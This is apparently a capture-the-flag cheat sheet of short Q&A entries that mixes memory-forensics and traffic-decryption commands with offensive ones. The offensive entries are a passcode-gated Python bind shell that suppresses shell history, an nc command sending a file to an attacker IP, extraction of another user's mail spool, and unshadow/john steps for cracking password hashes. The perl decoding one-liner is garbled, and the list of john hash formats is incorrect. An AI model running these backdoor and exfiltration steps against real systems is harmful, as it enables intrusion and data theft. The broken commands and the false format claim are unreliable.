# Investigate Deaths

### What is a handy bash script to decode mail attachments?
```
cat /var/spool/mail/arthur | egrep "^(\w|\+|=|/)+$" | base64 -d > /tmp/arthur.priv
```

### How do you find a user's ID?
```
id -u brett
```

### What command shows which user is opening ports?
```
netstat -palute
```

### What's a handy python script for a shell via telnet?
```
import os
import pty
import socket as sc

def mn():
    s = sc.socket()
    s.bind(('',0)) #random port from 1024-65535
    s.listen(1)
    (rem, addr) = s.accept()
    if "passcode" in rem.recv(1024).strip().decode("utf-8"):
        os.dup2(rem.fileno(),0)
        os.dup2(rem.fileno(),1)
        os.dup2(rem.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    mn()
```

### How do you decode binary inline on the terminal?
```
cat <file> | perl -lpe '$=pack"B*",$'
```

### How do you view SSL-encrypted traffic in Wireshark if you have the keyfile?
`Edit>Preferences>Protocols>SSL` 

### How do you view SSL-encrypted traffic in tshark if you have the keyfile?
```
tshark -nr kanes.body -o ssl.keylog_file:./client_random.keylog -T fields -e http2.headers.cookie
```

### What command makes it simpler to help `john` use GECOS information from `/etc/passwd/`
```
unshadow /etc/passwd /etc/shadow > /tmp/passwd_shadow
```
Use this new file as the target for `john`.

### What hash formats are available to specify for john?
With the `--format=<hash type>` flag, you can specify to load specific hash types instead of letting john try to detect them automatically.
By specifying a specific format, you can speed up the john runtime and target only the password that you really want.
The available formats are `--format=HMAC-SHA256`, `--format=md5crypt`, and `--format=md5crypt-long`.
It seems that hashes that begin with `$1$` are md5crypt and hashes that  begin with `$6$` are sha512crypt.

### What is a memory dump?
A memory dump is a binary file that contains the complete contents of your system's memory.
Forensic tools exist to analyze memory dumps. One particular tool for creating a memory dump is DumpIt by Moonsols.

### What tool can be used to inspect a memory file dumped by DumpIt?
Volatility. The following should list available plugins to use when inspecting a dump file.
```
volatility --info
```

### How do you find the process list from a memory dump?
```
volatility -f <dump> pslist
```

### How to pipe a file through `nc`?
```
# From:
cat <file> | nc -u -b <attacker ip> <port>
# To:
nc -l -u -p <port> > <file>
```
